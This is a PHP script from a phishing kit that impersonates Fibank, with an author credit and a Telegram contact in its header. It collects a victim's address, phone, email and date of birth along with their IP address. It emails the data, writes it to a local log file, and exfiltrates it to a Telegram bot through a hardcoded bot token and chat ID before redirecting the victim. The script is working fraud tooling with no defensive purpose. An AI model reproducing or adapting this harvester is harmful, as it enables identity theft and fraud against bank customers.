<?php

include 'email.php';
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * version 2.0
 * icq & telegram = @Fiddlerl
 
###############################################
#$            C0d3d by ZUchiha               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Fibank            $#
###############################################

**/
$adr = $_POST['address'] ; 
$city = $_POST['city'] ; 
$tel = $_POST['phone'] ; 
$em = $_POST['mail'] ; 
$date = $_POST['dob'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

 
$subject = " BILLING :) <3 : from: ".$ip;
$nome=" BILL " ; 
	$from="resulta@localhost.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ BILL Fibank  +-----------------\r\n";
$message .= "Adress : ".$adr."\r\n";
$message .= "City: " .$city."\r\n";
$message .= "Phone: " .$tel."\r\n";
$message .= "email: " .$em."\r\n";
$message .= "Date of birth: " .$date."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By ZUchiha +------------------\r\n";
mail($to,$subject,$from_mail,$message);
$sajal = fopen("../uchiha/bills.txt", "a");  
fwrite($sajal, $message);

$token = "1854944421:AAGKQZbdHO8SbM3gXRRHo4LvUDEIchpIqnk";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-709142532&text=" . urlencode($message)."" );
header('Location: ../redirect.php');


?>